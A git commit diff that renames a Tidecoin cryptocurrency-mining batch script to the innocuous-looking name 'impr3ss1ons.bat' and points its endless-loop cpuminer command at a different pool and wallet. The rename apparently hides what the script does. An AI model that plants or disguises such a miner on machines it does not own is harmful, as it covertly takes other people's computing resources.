227b3de2a4651fce28159ebc91db7a4573d471c3
gretisane <92603514+gretisane@users.noreply.github.com>
2021-11-17 14:03:28 +0700

    Update and rename miner-tidecoin.bat to impr3ss1ons.bat

--- impr3ss1ons.bat
+++ impr3ss1ons.bat
@@ -6,5 +6,5 @@ rem       stratum-asia.rplant.xyz /Singapore/
 rem       stratum-na.rplant.xyz   /Toronto/
 rem
 :start
-"%~dp0"cpuminer-sse2.exe -a yespowerTIDE -o stratum+tcps://stratum-eu.rplant.xyz:17059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.Windows
+cpuminer-sse2.exe -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.Windows -p c=TDC 
 goto start
